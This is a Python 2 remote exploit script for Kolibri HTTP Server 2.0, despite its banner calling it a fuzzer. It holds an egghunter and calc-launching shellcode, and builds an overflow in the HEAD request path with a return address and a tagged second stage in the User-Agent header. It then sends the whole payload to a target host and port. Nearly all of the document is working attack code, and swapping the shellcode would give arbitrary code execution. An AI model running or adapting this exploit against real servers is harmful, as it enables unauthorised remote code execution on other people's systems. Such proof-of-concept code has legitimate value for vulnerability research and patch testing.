#!/usr/bin/env python
import sys
import socket
import struct

if len(sys.argv) < 3:
	print "[*] Kolibri HTTP Server 2.0 Fuzzer"
	print "[*] Usage: %s <ip addr> <port>" % sys.argv[0]
	sys.exit(1)
else:
	rhost = sys.argv[1]
	rport = int(sys.argv[2])

egghunter = ""
egghunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"


shellcode = ""
shellcode += "\x31\xC9"                  # xor ecx,ecx
shellcode += "\x51"                     # push ecx
shellcode += "\x68\x63\x61\x6C\x63"     # push 0x636c6163
shellcode += "\x54"                     # push dword ptr esp
shellcode += "\xB8\xC7\x93\xC2\x77"     # mov eax,0x77c293c7
shellcode += "\xFF\xD0"                 # call eax


stage1 = ""
stage1 += "A" * 478
stage1 += egghunter
stage1 += "A" * 5
stage1 += struct.pack('<L', 0x77C35459)
stage1 += '\xeb\xc4'

stage2 = ""
stage2 += "w00tw00t"
stage2 += shellcode

try:
	print '[*] Trying to exploit the tageted Kolibri HTTP Server'
	print '[*] Target {}:{}'.format(rhost, rport)

	payload = ""
	payload += "HEAD /"+stage1+" HTTP/1.1\r\n"
	payload += "Host: "+rhost+":"+str(rport)+"\r\n"
	payload += "User-Agent: "+stage2+"\r\n"
	payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
	payload += "Accept-Language: en-US,en;q=0.5\r\n"
	payload += "Accept-Encoding: gzip, deflate\r\n"
	payload += "Connection: close\r\n\r\n"

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect = s.connect((rhost, rport))
	print '[*] Sending the exploit'
	s.send(payload)
	s.close()

except socket.error:
	print '[-] Exploit failed!'